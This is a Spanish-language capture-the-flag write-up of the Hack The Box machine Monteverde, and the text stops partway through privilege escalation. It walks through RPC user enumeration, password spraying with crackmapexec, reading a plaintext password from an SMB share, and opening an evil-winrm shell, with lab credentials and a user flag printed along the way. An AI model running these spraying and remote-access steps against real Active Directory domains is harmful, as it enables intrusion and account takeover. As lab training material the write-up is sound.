---
layout: single
title: Monteverde - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Monteverde de la plataforma de Hack The Box donde mediante el protocolo RPC vamos a estar enumerando usuarios del dominio y gracias a que un usuario usa su nombre como contraseña vamos a poder conectarnos al servicio smb y leer una contraseña en texto plano después haremos un password spray para darnos cuenta a que usuario le pertenece la contraseña y conectarnos con evil-winrm para la escalada de privilegios abusaremos de que estamos en grupo Azure Admins Group"
date: 2024-03-31
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-monteverde/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - Abusing Azure Admins Group
  - RPC Enumeration
---

## PortScan

- Comenzamos escaneando los puertos abiertos y los servicios que corre la maquina por el protocolo **TCP**.

```bash
➜  nmap nmap -sCV -p53,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49673,49674,49676,49697 10.129.228.111 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 12:45 CST
Nmap scan report for 10.129.228.111
Host is up (0.089s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-31 18:45:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-03-31T18:46:24
|_  start_date: N/A
```

## Enumeración

- Estamos ante un **Windows 10**.

```bash
➜  nmap crackmapexec smb 10.129.228.111
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

- Vamos agregar el nombre del dominio al `/etc/hosts`.

```bash
➜  content echo "10.129.228.111 MEGABANK.LOCAL" | sudo tee -a /etc/hosts
10.129.228.111 MEGABANK.LOCAL
```

- Vemos que la maquina tiene el servicio **RPC** así que podemos usar la herramienta `rpcclient` para enumerar este servicio empleando un `Null Session`.

```bash
➜  content rpcclient -N -U '' 10.129.228.111
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

- Como podemos enumerar usuarios del dominio vamos añadirlos a una lista.

```bash
➜  content rpcclient -N -U '' 10.129.228.111 -c enumdomusers | grep -oP '\[\D*?\]' | tr -d '[]' > users.txt
➜  content cat users.txt
Guest
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

- Como tenemos una lista de usuarios podemos probar con un `ASREPRoast` <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast>.

```bash
➜  content impacket-GetNPUsers MEGABANK.LOCAL/ -no-pass -usersfile users.txt
```

- Bueno como tal el ataque fallo y ningún usuario tiene configurado el UF_DONT_REQUIRE_PREAUTH <https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23>.

- Bueno nos volveremos a conectar con `rpcclient` para enumerar mas usando el servicio.

- Estos son los grupos del dominio.

```bash
➜  content rpcclient -N -U '' 10.129.228.111
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```

- Pero bueno poca cosa vamos a poder hacer.

```bash
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
```

## Shell as mhope

- Bueno tenemos un listado potencial de usuarios algo que podemos hacer es un **Password Spray** esto consiste en ver si algún usuario usa su nombre de usuario como contraseña para eso usaremos la herramienta de `crackmapexec`.

```bash
➜  content crackmapexec smb 10.129.228.111 -u users.txt -p users.txt --continue-on-success
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan STATUS_LOGON_FAILURE
```

- Con esto comprobamos que las credenciales son correctas.

```bash
➜  content crackmapexec smb 10.129.228.111 -u SABatchJobs -p 'SABatchJobs'
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

- Vemos que tenemos acceso de lectura a varios recursos a nivel de red uno que se ve interesante por el nombre es el de `users$`.

```bash
➜  content crackmapexec smb 10.129.228.111 -u SABatchJobs -p 'SABatchJobs' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [+] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       users$          READ
```

- Vamos a enumerar ese recurso compartido.

```bash
➜  content smbclient -U SABatchJobs //10.129.228.111/users$
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \>
```

- Vemos un archivo llamado **azure.xml**.

```bash
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \mhope\>
```

- Vamos a descárgalo.

```bash
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
```

- Si examinamos el archivo encontramos una contraseña.

```bash
➜  content cat azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

- Como ahora tenemos una contraseña nueva lo que podemos hacer básicamente es hacer otro `Password Spray` para ver si algún usuario utiliza la contraseña.

```bash
➜  content crackmapexec smb 10.129.228.111 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
```

- Podemos emplear `evil-winrm` gracias a que nos devuelve `Pwn3d!` y el usuario forma parte del grupo `Windows Remote Management`.

```bash
➜  content evil-winrm -i 10.129.228.111 -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
```

# user.txt

- Ahora ya podemos leer la flag.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> type C:\Users\mhope\Desktop\user.txt
2314ead90ec16835111baba6c8982424
```

## Escalada de privilegios

- Si vemos información del usuario que tenemos pertenecemos al grupo `Azure Admins` <https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&gad_source=1&gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB>.

>Microsoft Azure es una plataforma de computación en la nube creado por Microsoft para construir, probar, desplegar y administrar aplicaciones y servicios mediante el uso de sus centros de datos.

- Si vamos ala raíz hay una carpeta con el nombre `Program Files` que contiene archivos sobre este servicio.

```bash
*Evil-WinRM* PS C:\> cd 'Program Files'
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell


*Evil-WinRM* PS C:\Program Files>
```

- <https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/>, <https://blog.xpnsec.com/azuread-connect-for-redteam/>.

>The Azure AD Connect service is essentially responsible for synchronizing things between your local AD domain, and the Azure based domain. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc.

<iframe width="560" height="315" src="https://www.youtube.com/embed/JEIR5oGCwdg?si=7OpXxOEi_svvy2Di" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

- En el post nos comparten el siguiente repositorio <https://github.com/VbScrub/AdSyncDecrypt/releases>.

- Nos dicen que tenemos que estas en la siguiente ruta para que funcione.

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> cd 'C:\Program Files\Microsoft Azure AD Sync\Bin'
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> dir


    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:53 PM                ADSync
d-----         1/2/2020   2:53 PM                ADSyncDiagnostics
d-----         1/2/2020   2:53 PM                Assemblies
d-----         1/2/2020   2:53 PM                Microsoft.VC100.CRT
-a----        8/31/2018   4:53 PM          32640 AADConfig.dll
-a----        8/31/2018   4:53 PM          78920 AADPasswordResetExtension.dll
-a----        8/31/2018   4:54 PM        1579904 configdb.dll
-a----        8/31/2018   4:54 PM          15416 csdelete.exe
-a----        8/31/2018   4:54 PM          35896 csexport.exe
-a----        8/31/2018   4:54 PM          25656 CSExportAnalyzer.exe
-a----         1/2/2020   2:53 PM            240 InstalledServiceInstances.config
-a----        8/31/2018   4:56 PM          86400 libutils.dll
-a----        8/31/2018   4:53 PM         284816 ManagedCustomActions.CA
-a----        8/31/2018   4:54 PM          37944 mapackager.exe
-a----        8/31/2018   4:54 PM         335744 mcrypt.dll
-a----        8/31/2018   4:54 PM          98688 Microsoft.Azure.ActiveDirectory.Client.Framework.dll
-a----        8/31/2018   4:54 PM         125496 Microsoft.Azure.ActiveDirectory.Synchronization.Config.dll
-a----        8/31/2018   4:53 PM          94776 Microsoft.Azure.ActiveDirectory.Synchronization.Framework.dll
-a----        8/31/2018   4:53 PM          37432 Microsoft.Azure.ActiveDirectory.Synchronization.PowerShellConfigAdapter.dll
-a----        8/31/2018   4:54 PM          29568 Microsoft.Azure.ActiveDirectory.Synchronization.ProvisioningWebServiceAdapter.dll
-a----        8/31/2018   4:53 PM          85568 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll
-a----        6/20/2017   1:52 PM             70 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll.config
-a----        8/31/2018   4:53 PM          30280 Microsoft.CredentialManagement.OnPremisesPasswordReset.Shared.dll
-a----        8/31/2018   4:54 PM         143416 Microsoft.IdentityManagement.Error.ErrorBridge.dll
-a----        8/31/2018   4:54 PM          18488 Microsoft.IdentityManagement.ManagedLogger.dll
-a----        8/31/2018   4:54 PM         221056 Microsoft.IdentityManagement.PowerShell.ObjectModel.dll
-a----        5/23/2018   7:46 PM         295024 Microsoft.IdentityModel.Clients.ActiveDirectory.dll
-a----        5/23/2018   7:46 PM          22128 Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll
-a----        8/31/2018   4:54 PM          17280 Microsoft.MetadirectoryServices.DataAccess.dll
-a----        8/31/2018   4:54 PM          16768 Microsoft.MetadirectoryServices.Host.dll
-a----        8/31/2018   4:54 PM          66432 Microsoft.MetadirectoryServices.Impl.dll
-a----        8/31/2018   4:54 PM          27520 Microsoft.MetadirectoryServices.LDAPQueryClient.dll
-a----        8/31/2018   4:54 PM          26688 Microsoft.MetadirectoryServices.PasswordHashSynchronization.Types.dll
-a----        8/31/2018   4:54 PM          54344 Microsoft.MetadirectoryServices.Scheduler.dll
